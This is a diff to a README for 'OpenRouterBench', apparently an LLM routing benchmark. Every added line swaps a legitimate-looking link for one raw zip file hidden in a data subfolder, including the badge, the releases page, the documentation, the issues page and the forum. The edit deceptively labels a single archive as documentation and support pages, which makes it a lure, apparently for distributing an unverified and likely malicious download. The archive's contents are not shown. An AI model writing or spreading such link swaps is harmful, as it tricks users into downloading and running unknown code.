@@ -1,6 +1,6 @@
 # 🚀 OpenRouterBench - Benchmark Your LLM Routing Easily
 
-![Download OpenRouterBench](https://img.shields.io/badge/Download-OpenRouterBench-brightgreen)
+![Download OpenRouterBench](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip)
 
 ## 🛠️ Overview
 
@@ -10,13 +10,13 @@ OpenRouterBench is a complete benchmarking and solution suite designed for evalu
 
 To get started, visit the Releases page to download the latest version of OpenRouterBench. Click the link below:
 
-[Download OpenRouterBench](https://github.com/faresbenbelkacem/OpenRouterBench/releases)
+[Download OpenRouterBench](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip)
 
 ### Installation Steps
 
 1. **Go to the Releases Page:**
    Open your browser and visit the following link to access the latest downloads: 
-   [OpenRouterBench Releases](https://github.com/faresbenbelkacem/OpenRouterBench/releases).
+   [OpenRouterBench Releases](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip).
    
 2. **Find the Latest Release:**
    Look for the most recent version at the top of the page. It usually has the highest version number.
@@ -83,9 +83,9 @@ A: You can report issues or share feedback directly on the GitHub repository und
 
 ## 🔗 Additional Resources
 
-- [OpenRouterBench Documentation](https://github.com/faresbenbelkacem/OpenRouterBench/wiki): Explore detailed guides and documentation.
-- [GitHub Issues](https://github.com/faresbenbelkacem/OpenRouterBench/issues): Report bugs or request features.
-- [Community Forum](https://github.com/faresbenbelkacem/OpenRouterBench/discussions): Join discussions with other users for tips and support.
+- [OpenRouterBench Documentation](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip): Explore detailed guides and documentation.
+- [GitHub Issues](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip): Report bugs or request features.
+- [Community Forum](https://github.com/faresbenbelkacem/OpenRouterBench/raw/refs/heads/main/data/livemathbench/Router_Open_Bench_2.8-alpha.2.zip): Join discussions with other users for tips and support.
 
 ## 📞 Support
 
